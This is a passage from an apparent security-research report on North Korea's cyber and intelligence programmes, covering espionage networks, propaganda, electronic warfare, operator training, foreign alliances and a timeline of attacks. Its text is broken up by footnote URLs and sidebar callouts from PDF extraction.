According to South Korean reports, the culprits used an auto-player to quickly
progress in the massively multiplayer online role-playing game (MMORPG) 
Lineage
 and were
able to use the game
s market to obtain real currency.168 In 2013, South Korean officials released
information stating they had found evidence that North Korea was using games as a medium for
infecting machines and launching cyber attacks. North Korea had used game downloads to infect
100,000 South Korean machines for a botnet used to launch a distributed denial of service (DDoS)
attack against Incheon Airport.169 This clever tactic sought to leverage a seemingly innocent game
as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure
target. However, in this case, there was little impact on the target.
Intelligence and counterintelligence
North Korea
s intelligence program is one of its strongest military assets, providing foundational
support for all other military operations. The regime
s cyber warfare capabilities, in particular, rely
heavily on open-source intelligence (OSINT) collection and cyber-espionage. 170 As noted in a CIA
publication, "It is a significant irony of our information age that open-source intelligence is
contributing to the survival and development of one of the world's most secretive regimes."171
Historically, the primary goals of the regime
s intelligence program included collection and
dissemination of intelligence concerning any possible political, military, or economic threat to the
regime
s security and stability. Secondary goals have included "acquisition of foreign military and
civilian technologies and equipment, support of the DPRK
s foreign policy goals, training and
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf
    http://www.theguardian.com/technology/2011/aug/04/south-north-korean-hackers-china
    http://english.chosun.com/site/data/html_dir/2011/05/06/2011050600827.html
    http://www.zdnet.com/blog/security/north-korea-ships-malware-infected-games-to-south-korean-users-uses-them-to-launch-ddos-
attacks/12383
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
    https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
support for foreign revolutionary and terrorist organizations, and the acquisition of foreign capital
for state and intelligence operations."172
North Korea has a broad reach for intelligence collection, which extends to cyber intelligence.173
In April 2013, Solutionary, a company providing managed security services, reported a marked
increase in both overt attacks and information gathering attempts originating from
North Korean IPs. Solutionary refers to any overt external attacks on company               A faction of ethnic North
                                                                                            Koreans residing in Japan,
networks or attempts to steal data as "touches.
 They reportedly recorded 12,473 of
                                                                                            known as the Chongryon,
these touches in February 2013, 11,000 of which were directed at a single financial         are critical to North Korea
institution. As a baseline, Solutionary noted that typically only 200 incidents per         cyber and intelligence
month are traced to North Korean origin. This is an interesting claim, considering
                                           174                                              programs.
that attacks attributed to North Korea are usually routed through other countries.
As mentioned above, a faction of ethnic North Koreans residing in Japan, known as the Chongryon,
are critical to North Korea
s cyber and intelligence programs and help generate hard currency for
the regime. The Chongryon headquarters has been recognized as the de facto North Korean
embassy in Japan. In 2012, the organization
s headquarters was seized to pay for the group
past due debts.175
Figure 15 Headquarters of the Chongryon.176
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH13.pdf
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
    http://www.usatoday.com/story/tech/2013/04/26/cyberspying-from-north-korean-ip-addresses-spike/2115349/
    http://sundaytimes.lk/?option=com_content&view=article&id=21034:japan-court-approves-seizure-of-nkorea-embassy-
media&catid=81:news&Itemid=625
    http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/
It was then purchased by a monk named Ekan Ikeguchi, who let the Chongryon continue to use
the building in what he referred to as a 
goodwill gesture
. Ikeguchi is one of the Chongryon
many ties to organized crime. Ikeguchi was arrested in the past for an attempted coup against the
Japanese government. He also has ties to the political group Nihon Seinensya, which is involved in
illegal activities in conjunction with the yakuza syndicate Sumiyoshi-kai, which imports and sells
amphetamines made in North Korea.177 North Korea also has black market ties to Sumiyoshi-kai
rival syndicate, Yamaguchi-gumi. Many members of the Kodo-kai, Yamaguchi-gumi
s ruling
faction, are Korean-Japanese, with ties to North Korea.178 Masahiro Namikawa, leader of the drug
trafficking Seido-kai yakuza organization, also has ties to the Chongryon.179
The Chongryon operate at least two websites, chongryon.com, which is in Japanese, and korea-
np.co.jp.
WHOIS records for chongryon.com indicate that it was registered by 
guanin o
 using the email
address park2@mac.com. The WHOIS information for korea-np.co.jp. shows that it was
registered by Choson Shinbo Company Inc. The WHOIS records for these sites can be found in
Appendix A.
Additionally, the Chongryon operate a ferry called the Mangyongbong-92, the only direct transit
from Japan to North Korea. In 2003, they were suspected of using the ferry to smuggle missile
parts.180 In 2006, the ferry was temporarily banned from Japanese waters when Japanese officials
discovered the Chongryon were using it to smuggle dual-use electronics to North Korea to be
used for military purposes.181
North Korea has a global network of state-run businesses located in 30 to 40                                                  North Korea has a global
countries that is used for espionage activities. The Reconnaissance General Bureau                                            network of state-run
is responsible for oversight of this network.182 The businesses include cafes and                                             businesses located in 30 to
other non-suspect establishments. The highest concentration of these is in China.                                             40 countries that is used for
                                                                                                                              espionage activities. These
Members of this espionage network reportedly 
send more than $100 million in
                                                                                                                              establishments are also
cash per year to the regime and provide cover for spies.
183 These establishments                                             used for money laundering
are also used for money laundering and drug trafficking.184                                                                   and drug trafficking.
The regime is also known to kidnap foreign citizens and use them as instruments
for intelligence. Prisoners are first tortured and psychologically conditioned to bend to the
regime
s will. They are then used based on their skillset. This may include teaching their language
to North Koreans, spreading propaganda in their native language, providing translation services,
    http://japandailypress.com/religious-group-that-bought-north-korean-embassy-building-has-mob-ties-0826568/
    http://culturmag.de/crimemag/jake-adelstein-the-yakuza-2/20212
    http://www.thedailybeast.com/articles/2013/06/25/the-great-japanese-gang-wars.html
    http://news.bbc.co.uk/2/hi/asia-pacific/2958968.stm
    http://www.washingtontimes.com/news/2006/oct/16/20061016-122859-4745r/
    http://www.ibtimes.com/north-koreas-international-network-restaurants-used-gain-hard-currency-espionage-1427242
    http://www.outsideonline.com/outdoor-adventure/politics/Did-North-Korea-Kidnap-This-American-
Hiker.html?utm_content=buffer6bd46&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
    http://freebeacon.com/national-security/north-koreas-overseas-restaurants-used-for-espionage-and-gaining-hard-currency/
conducting military training, or other skills the regime deems useful.185 In July 2014, Japanese
officials agreed to lift some sanctions on North Korea when the regime agreed to investigate the
whereabouts of Japanese citizens who were allegedly abducted by North Korean agents decades
ago. Sanctions to be lifted include the ban on port calls to Japan by North Korean ships.186
North Korea has also infiltrated important positions in South Korea for both intelligence and
psychological operations purposes.187 In 2011, South Korea
s National Intelligence
Service reportedly discovered the presence of Communist spies. These spies within their trusted
circles had been reporting back to North Korea for almost 10 years. The embedded spies included
a Democratic Party representative. According to the agency, the spies were on a mission to
infiltrate and influence the Democratic Party and to gather military intelligence.188 The regime also
attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea, in
order to gain intelligence. In the past several years, South Korea has arrested at least 14 defectors
who were found to be spies.189
These intelligence collection and counterintelligence capabilities are an attempt to provide the
regime with a strategic asymmetrical advantage. The regime leverages its human and cyber
resources around the globe to provide an influx of intelligence, while very little credible
intelligence about the regime
s activities and capabilities ever becomes available to the outside
world.
Psychological operations
North Korea continues to be a master of propaganda and deception and leverages the cyber
realm for psychological operations. Modern North Korean psychological operations tactics include
distribution of propaganda via traditional media outlets, websites, and social media. Many of
these psychological operations campaigns are politically focused.190 According to Dr. Andrei
Lankov, the North Korean government has 
very rational and highly successful manipulators who
usually get what they want by outsmarting everybody else in the process.
The regime
s Unit 204 is responsible for cyber-psychological operations. These
operations are PSYOP tailored for the cyber arena. In order to be successful, cyber-     Such messages can be
                                                                                         used for recruitment,
psychological campaigns require speed, precision, and creativity. These campaigns        cyber mobilization, and to
leverage the phenomenon of viral, unverified news stories that tend to rapidly           instill fear in a target
propagate via social media, mobile text messaging, and other electronic                  population.
communications. This phenomenon creates an arena for strategic propagation of both
fact and fiction for the purposes of sentiment manipulation. Such messages may be used for
    http://www.outsideonline.com/outdoor-adventure/politics/Did-North-Korea-Kidnap-This-American-
Hiker.html?utm_content=buffer6bd46&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
    http://m.us.wsj.com/articles/tokyo-to-lift-some-sanctions-on-pyongyang-1404354699?mobile=y
    http://www.nytimes.com/2013/10/02/world/asia/northern-spy-lifts-cloak-on-koreas-deadly-rivalry.html?pagewanted=2
    http://www.kccoc.org/home/?mid=eng_kccoc_info_korea&document_srl=3223&sort_index=readed_count&order_type=desc
    http://www.washingtonpost.com/world/prominent-n-korean-defector-acquitted-of-espionage-by-s-korean-court/2013/08/22/642b3712-0b19-
11e3-89fe-abb4a5067014_story.html
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
recruitment, cyber mobilization, and to instill fear in a target population. Cyber-psychological
operations may also include mental suggestion using technology as a delivery mechanism for
subliminal cues. It is unknown whether North Korea possesses this capability.192
North Korean citizens have access to state-approved social networks on the Kwangmyong.193
Figure 16 A photo posted by Jean Lee on Instagram shows one of the social networking sites on
the Kwangmyong.194
The regime has a limited overt social media presence on the Internet. Some of the known social
media platforms employed by the regime include Twitter, Facebook, and YouTube. The YouTube
channel North Korea Today, operated by user rodrigorojo1, features news clips from North Korea.
It is unclear whether this channel is officially sanctioned.195 The North Korea Today YouTube
channel also has corresponding profiles on Twitter196 and Facebook.197
    http://fmso.leavenworth.army.mil/documents/new-psyop.pdf
    http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
    http://instagram.com/p/WpcJs1OCkb/
    https://www.youtube.com/user/rodrigorojo1
    https://twitter.com/NorthKoreaT0day
    https://www.facebook.com/pages/Korean-Central-Television/380193555435568?fref=ts
Figure 17 A screenshot of the North Korea Today YouTube Channel.198
The Uriminzokkiri website, known for pushing juche ideology and anti-American and anti-South
Korean messages, has accompanying social media profiles on YouTube,199 Google+,200 and
Facebook.201 It also has Twitter profiles in both Korean202 and English.203
    https://www.youtube.com/user/rodrigorojo1
    https://www.youtube.com/user/uriminzokkiri
    https://plus.google.com/u/0/112306344682887627095
    https://www.facebook.com/pages/Uriminzokkiri/124452740935216
    https://twitter.com/uriminzok
    https://twitter.com/uriminzok_engl
Figure 18 A screenshot of the Uriminzokkiri YouTube channel.204
Figure 19 A screenshot from the Uriminzokkiri Facebook page shows anti-U.S. and pro-juche
rhetoric.205
      https://www.youtube.com/user/uriminzokkiri/featured
      https://www.facebook.com/pages/Uriminzokkiri/124452740935216
Figure 20 A screenshot of the Uriminzokkiri Korean language Twitter profile.206
Figure 21 A screenshot of the Uriminzokkiri English language Twitter profile.207
North Korean propaganda208 is used for several purposes: to enforce the ideals of allies       In the spirit of juche,
and sympathizers, to frame North Korea in a favorable light to outsiders, to                   the regime uses
sensationalize the regime
s perceived self-reliance and military prowess, and to shield its    disinformation to 
hide
                                                                                               lapses or tout
own citizens from the outside world.209 Juche ideology and indoctrination of the regime
                                                                                               accomplishments that
youth ensure support of the local population. North Koreans accept military duty as an         may have never been
honor and strive to excel in their service to the regime. In the spirit of juche, the regime   achieved.
uses disinformation to 
hide lapses or tout accomplishments that may have never been
    https://www.facebook.com/pages/Uriminzokkiri/124452740935216
    https://twitter.com/uriminzok_engl
    http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
    http://fas.org/irp/eprint/cno-dprk.pdf
achieved.
210 Limiting citizen access to the outside world by instituting the Kwangmyong intranet,
North Korea ensures its citizens are not exposed to outside information that is counterproductive
to citizen indoctrination or in conflict with juche ideals. North Korea portrays the West, particularly
the United States, as an enemy. The regime uses this strategy of shifting the population
negative sentiments toward an external entity to keep its citizens ignorant of North Korea
s own
economic hardship, regime brutality, and systemic incompetence.211 For example, prior to Kim
Jong Il
s death in 2011, North Korean media altered photos of their 
Dear Leader
 to make him
appear younger and healthier than he really was. This became obvious when the altered photos
were compared to those taken by Western media around the same time. 212
According to Dr. Andrei Lankov, 
North Koreans now have a much better understanding of what is
going on in the outside than they did before. This is largely thanks to the spread of DVDs and
video content in the country, but also because some of them have been to China and talk about
what they have seen
many [of] them sincerely believe that the United States remains ready to
attack at any moment and that Japan is an incurably aggressive place
nearly all of them swallow
the official propaganda myths about the Korean War being started by the 'American Imperialists'
who invaded them. Hence, they see the outside world as an inherently dangerous place.
213 Some
human rights groups seek to reach out to North Korean citizens and break them from this
isolation. In August 2014, the New York-based charity Human Rights Foundation sponsored a
hackathon in San Francisco called 
Hack North Korea
 to find new ways to get information in, out,
and around North Korea. The event brought together many programmers, human rights
campaigners, and defectors.214
North Korea even uses 
trolling
 as a PSYOP tactic. On the Internet, 
trolls
 are users who post
messages that are often crass, controversial, inflammatory, or offensive, in order to evoke a
strong reaction or influence a reader
s opinion. Often, the motivation for trolling is simply for the
troll
s enjoyment. The rude and offensive trolling tactics are in stark contrast to traditional forms
of persuasive rhetoric. However, North Korea reportedly utilizes over 200 military intelligence
operatives to troll South Korean message boards and social media pages with pro-North Korean
sentiments.215 Matt Rhoades, director of the cyberspace and security program at the Truman
National Security Project, said, "North Korea's cyber-development is almost just a new
harassment mechanism for them, a low-cost, asymmetric method to harass its neighbor in the
south
"216
Leveraging the cyber and intelligence resources noted above, North Korea
s psychological
operations serve an important strategic role. The ability to influence outsiders, while effectively
isolating its own population from most outside influence, allows North Korea to remain an
enigma. Additionally, in line with its PSYOP tactics, North Korea may strategically take credit for
cyber attacks that were, in reality, launched by another entity. Whether the targeted entity blames
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
    https://www.strategypage.com/htmw/htmurph/articles/20131106.aspx
    http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
    http://www.northkoreatech.org/2014/08/05/hack-north-korea-focuses-silicon-valley-on-information-flow/
    http://www.strategypage.com/htmw/htiw/articles/20131213.aspx
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
North Korea for the attacks, or the regime simply takes credit for an attack that has not yet been
attributed, several PSYOP goals can come into play. First, to claim credit for an attack amplifies
the impact of a show of force, particularly if South Korea is the target. This tactic can be used to
stir sentiments in order to provoke a reaction. Second, North Korea may lay claim to responsibility
for an attack that exceeds its capabilities in order to seem more technologically advanced and
more capable. Third, any success, or the appearance thereof, enforces the juche ideal of regime
self-sufficiency. Finally, North Korea may act as a scapegoat and claim credit for a cyber attack of
an ally such as China so the attack is not attributed to the real actors.217
Electronic warfare
North Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS
coordinates.218 North Korea demonstrated these capabilities in March 2011 by jamming South
Korea
s GPS signals during a joint U.S.-South Korea military exercise.219 North Korea has the
capability to create an EMP.220 An EMP is a sudden, extreme outburst of atmospheric electricity
creating an intense magnetic field that can burn out electrical equipment. 221 A report from the
U.S. Department of Homeland Security (DHS) noted North Korea
s ability to deliver a nuclear
warhead as a satellite over the South Pole, effectively creating the burst needed to deliver an EMP
targeting the United States. An EMP could effectively disrupt electronic communications including
critical infrastructure components such as telecommunications, financial institutions, the energy
sector, transportation, food and water delivery, emergency services, and space systems. 222 North
Korea reportedly acquired its EMP technology from Russia.223
North Korea also has a drone program. The regime reportedly acquired its first drones in the late
1980
s or early 1990
s. The regime
s drones are complimentary to its intelligence program and
are primarily used for surveillance.224 In early 2014 a North Korean drone crashed south of the
38th parallel, the line dividing North Korea from the south.225 While early reports noted that the
drones appeared similar to those manufactured by Chinese company Tauyuan Navigation Friend
Aviation Technology, the company denied involvement.226
    http://fas.org/irp/doddir/army/fm3-05-301.pdf
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
    http://defensetech.org/2007/12/24/inside-dprks-unit-121/
    http://usatoday30.usatoday.com/tech/science/2010-10-26-emp_N.htm
    http://www.wnd.com/2014/04/dhs-study-north-korea-capable-of-emp-attack-on-u-s/
    http://www.extremetech.com/extreme/170563-north-korea-emp
    http://38north.org/2014/07/jbermudez070114/?utm_source=feedly&utm_reader=feedly&utm_medium=rss&utm_campaign=jbermudez070114
    http://www.popsci.com/blog-network/eastern-arsenal/north-koreas-new-drones-are-chinese-which-opens-new-mystery
    http://www.scmp.com/news/china-insider/article/1494207/north-korean-drones-not-theirs-says-chinese-retailer
Figure 22 A drone attributed to North Korea. 227
Stressing the importance of the regime
s electronic warfare capabilities, in 1999 former regime
leader Kim Jong Il said 
The basic key to victory in modern warfare is to do well in electronic
warfare.
228 Since the regime
s advanced technology lags behind that of South Korea and the U.S.,
its capability to disrupt the communications of these perceived adversaries is a vital asymmetric
capability.229
Training cyber warriors
North Korea utilizes primary and secondary education and the university system to train its cyber
warfare operators. According to reports by defectors, the regime seeks out children who show
mathematical talent and sends them through rigorous advanced training.230 A vintage North
Korean animation stresses the importance of mathematics in North Korean education. The short
film follows a young boy as he does his geometry homework. The frustrated boy begins to
daydream then has visions of going to war with the U.S. and needing geometry to effectively
calculate missile trajectory during the battle.231
    http://blogs.wsj.com/korearealtime/2014/04/02/seoul-points-to-north-korea-in-crashed-drones-investigation/
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH13.pdf
    http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH5.pdf
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://theweek.com/article/index/255243/how-to-kill-americans-with-geometry-a-north-korean-propaganda-film-for-kids
Figure 23 A screenshot from the North Korean animation depicting geometry as a necessary skill
for battle.232
Science and technology students are expected to learn foreign languages, which may include
Chinese, Japanese, and English.233 Student emails, chats, and web browsing activities are heavily
monitored.234 Around age twelve or thirteen, chosen students are enrolled in accelerated
computer courses at First and Second Geumseong Senior-Middle Schools.
    https://www.youtube.com/watch?v=ujtp-70zQME
    https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
    http://www.thestar.com/news/world/2014/02/23/north_korea_where_the_internet_has_just_5500_sites.html#
Figure 24 North Korean students training for cyber war.235
The successful students are then sent to Kim Il-sung University, Kim Chaek University of
Technology,236 or the Command Automation University, traditionally known as Mirim University.
Kim Il-sung University
s computer center was started in 1985. Its computer courses have a heavy
programming element. The university reportedly developed the Intelligent Locker hard disc
protection program, Worluf Antivirus, SIMNA (simulation and system analysis program), a war
games program, a hepatitis diagnosis and prescription system, and a C++ program development
tool called FC 2.0.237 Kim Il-sung University also has programs focusing on nuclear research.238
Kim Chaek University of Technology was established in 1948. In the late 1990s, it began to
restructure its computer-focused courses to reflect more modern technologies. As of 2002, the
university had three colleges focusing on computer science, information science and technology,
and machine science. Software developed by the university includes Computer Fax and SGVision,
an image-reprocessing program used for steganography.239 Students and instructors must
submit a formal request for permission in order to use the Internet for research.240
    http://www.courierpress.com/news/2013/apr/19/young-north-koreans-train-seek-revenge-us/
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://www.nti.org/facilities/789/
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://www.theguardian.com/world/2013/jan/08/north-korean-google-chief-search
The Command Automation University periodically chooses around 100 students for an intensive
five-year course prior to their assignment to serve in cyber intelligence and cyber warfare
capacities.241 Programs at the Command Automation University include command automation,
computers, programming, automated reconnaissance, and electronic warfare.242 Other students
attend a two-year accelerated university program, then study abroad in Russia or China before
they are assigned to a cyber-operator role.243
The elite cyber operators are given special incentives. For example, parents of students
graduating from the cyber program with top scores are given the opportunity to live in
Pyongyang; and married cyber operators are given housing, a food allowance, and a stipend if
operating overseas. Due to the nature of their profession, these cyber elite are some of the only
North Koreans allowed to access the outside Internet.244
Important political and military ties
While this report focuses on North Korea
s cyber warfare capabilities, these capabilities cannot be
fully separated from the implications of partnerships with countries known to deal in illegal
weapons trade with the regime. Now that cyberspace has become a legitimate arena for warfare,
these nations are also potential allies in the cyber realm. For this reason, the regime
s key political
and military relationships are explored below.
China
North Korea has a longstanding historical relationship with China. During the Korean War (1950-
1953), China allied with North Korea
s Communist forces. China has also provided ongoing
political and economic support to the regime
s leadership and is a primary trade partner. North
Korea is economically dependent on China. North Korea gets an estimated 90 percent of its
energy imports, 80 percent of its consumer goods, and 45 percent of its food supply from China.
This relationship is prudent 
 in the event of a military conflict, China can strategically use North
Korea as a buffer zone between itself and South Korea, where many U.S. military personnel are
stationed. Chinese aid to North Korea also deters the likelihood that the regime will collapse,
resulting in internal destabilization that could catalyze a U.S.-China conflict.245
North Korea relies heavily on China for technological resources. As noted above, North Korea
relies on China
s Unicom for Internet access.246 Additionally, the regime sends some of its cyber
warriors to train in China247 and stations a portion of its Unit 121 personnel in Shenyang.248 Some
of North Korea
s official websites are hosted in China, 249 and KCC has a branch office there.250
    https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
    http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.cfr.org/china/china-north-korea-relationship/p11097#p1
    https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
    http://binarycore.org/2012/05/30/investigating-north-koreas-netblock-part-3-topology/
    http://www.naenara.com.kp/en/kcc/
North Korea also relies on China to provide much of its network hardware, including servers and
routers.251
Russia
North Korea has a long history of ties to Russia. The former Soviet Union was the major sponsor
of the North Korean state and a major trading partner. Following the dissolution of the Soviet
Union, aid to North Korea was halted and trade diminished significantly. This chain of events
contributed to North Korea
s eventual economic collapse, as it could not survive without aid.252
North Korea currently has a collaborative relationship with Russia in the cyber realm. The regime
CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends
some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP
technology from there.255
Political ties between Russia and North Korea have become stronger in recent months. In 2014,
potentially as a result of the U.S. response to the Russian-Ukranian conflict, Russia began to
strengthen ties with North Korea. Negotiations reportedly included promises of trade and
development projects. Narushige Michishita, a North Korea and Asia security expert at Japan's
National Graduate Institute for Policy Studies, stated 
By strengthening its relationship with North
Korea, Russia is trying to enhance its bargaining position vis-
-vis the United States and Japan.
Russia also recently forgave most of the regime
s debts.257
Iran
North Korea and Iran have longstanding political and military ties. North Korea supplied Iran with
conventional arms during the Iran-Iraq War. Iran and North Korea reportedly collaborate closely in
ballistic missile development efforts. In the past, Iran provided the North Korean regime with
necessary funds and oil in exchange for missile parts and technology. 258 259 In 2009, a North
Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after
making an unscheduled stop in Bangkok, Thailand. That same year, United Arab Emirates seized a
ship bound for Iran that was transporting several containers of North Korean weapons, including
rocket-propelled grenades and ammunition. Reportedly, the customer was a company affiliated
with Iran
s Islamic Revolutionary Guard Corps. 260 261
North Korea also has cyberwar ties with Iran. In 2012, North Korea and Iran signed a technology
treaty to help combat 
common enemies
 in cyberspace. The treaty included provisions for
cooperation in research, student exchanges, and joint laboratories. Joint projects reportedly
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
    http://www.aljazeera.com/indepth/opinion/2014/06/n-korea-russia-step-toward-worl-201462253320470677.html
    https://www.cia.gov/library/center-for-the-study-of-intelligence/kent-csi/vol48no1/pdf/v48i1a04p.pdf
    http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
    http://www.extremetech.com/extreme/170563-north-korea-emp
    http://www.theguardian.com/world/2014/jun/04/russia-bolster-ties-north-korea
    http://www.voanews.com/content/russia-forgives-north-korean-debt/1939188.html
    http://thediplomat.com/2013/10/the-iran-secret-explaining-north-koreas-rocket-success/2/
    http://humanities.tau.ac.il/iranian/en/previous-reviews/10-iran-pulse-en/117-10
    http://www.armscontrol.org/factsheets/dprkchron
    http://www.irantracker.org/foreign-relations/north-korea-iran-foreign-relations
include IT information sharing, engineering, biotechnology, renewable energy, and sustainability.
F-Secure
s Mikko Hypponen stated, "It's highly likely that one of the reasons for this co-operation
is for them to work together regarding their cyber defence and cyber offense strategies".
Hypponen cited Flame malware as a possible triggering event for the creation of this treaty.
Others also suspect that Iran and North Korea
s mutual interest in development of nuclear
weapons and the need to protect refineries against malware such as Stuxnet were driving factors
in the establishment of the treaty.262 U.S. House Foreign Affairs Committee leaders assert that the
treaty indicates North Korea and Iran are collaborating on a joint nuclear weapons program.263
Additionally, North Korea, in conjunction with Iran and Syria, reportedly supports both Hamas and
Hezbollah in procuring kinetic weaponry and communications equipment and in establishing
operational infrastructure.264 265 266
Syria
North Korea has both a cyber relationship and kinetic weapons ties with Syria. KCC reportedly has
a branch in Syria.267
In 2007, Israel launched an airstrike, destroying a Syrian target that was allegedly a nuclear facility
under construction with North Korea
s assistance. U.S. officials noted the facility was modeled on
the North Korean nuclear reactor at Yongbyon.268
The North Korea-Syria relationship becomes more important in the context of both countries
 ties
with Iran. As noted above, Iran, North Korea, and Syria jointly provide support to extremist groups
Hamas and Hezbollah.269 270 271 Additionally, as we explored in HPSR Security Briefing Episode 11,
Iran and Syria
s military alliances extend to joint SIGINT and cyber operations.272
Cuba
North Korea also has an interesting relationship with Cuba 
 one that includes supplying weapons
and apparent attempts to illegally smuggle weapons. In 2013, a North Korean cargo ship on its
return voyage was stopped near the Panama Canal. The ship was carrying surface-to-air missile
parts, disguised as containers of sugar. In an attempt to save face, Cuba
s Ministry of Foreign
Affairs stated that the cargo included "240 metric tons of obsolete defensive weapons -- two anti-
aircraft missile complexes Volga and Pechora, nine missiles in parts and spares, two Mig-21 Bis
and 15 motors for this type of airplane, all of it manufactured in the mid-20th century -- to be
    http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
    http://www.voanews.com/content/ties-among-north-korea-syria-iran-a-major-security-threat/1639769.html
    http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+
Informed+Analysis+of+North+Korea%29
    http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted
    http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088
    http://www.naenara.com.kp/en/kcc/
    http://www.armscontrol.org/factsheets/dprkchron
   http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+
Informed+Analysis+of+North+Korea%29
    http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted
    http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088
    http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U_TiZGSwL-0
repaired and returned to Cuba." Experts said the cargo appeared to include a SNR-75 Fan Song
fire-control radar system for an SA-2 missile, a Soviet-era missile system that was also used in
Cuba.273 Following the incident, Fidel Castro credited former North Korean leader Kim Il-Sung for
providing Cuba with weapons near the end of the Cold War. Weapons included 100,000 AK rifles
and necessary ammunition.274
While no apparent cyber relationship exists between North Korea and Cuba at this time, their track
record for weapons trade means the potential for future collaboration in the cyber realm cannot
be discounted.
Timeline of significant North Korean cyber activity
2004
       North Korea gains access to 33 South Korean military wireless communication
           networks275
2006
       The U.S. State Department is attacked by entities in the East Asia-Pacific region. The
           attacks coincided with State Department negotiations with North Korea regarding the
           regime
s nuclear missile tests. (June)276
      
    A South Korean military official states North Korea
s Unit 121 has breached South Korean
           and U.S. military entities. (July)277
2007
       North Korea tests a logic bomb (October)278
2009
       North Korea states that it is 
fully ready for any form of high-tech war.
 (June)279
       DarkSeoul DDoS and disk wiping malware targeting South Korean and U.S. government,
           media outlet, and financial websites. These attacks also coincided with U.S. Independence
           Day. (July)280 281
       Malware for 
Operation Troy
 was likely planted.282
2010
       DarkSeoul Backdoor.Prioxer detected (June) 283
       Korean Central News Agency website becomes North Korea
s first known direct
           connection to the Internet (October)284
    http://www.nbcnews.com/news/other/north-korean-ship-carrying-hidden-missile-equipment-detained-after-leaving-f6C10647045
    http://www.abc.net.au/news/2013-08-15/fidel-castro-cuba-north-korea-war-ussr/4887920
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.huffingtonpost.com/2009/07/11/north-korea-army-lab-110-_n_229986.html
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://powerofcommunity.net/poc2009/si.pdf
    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
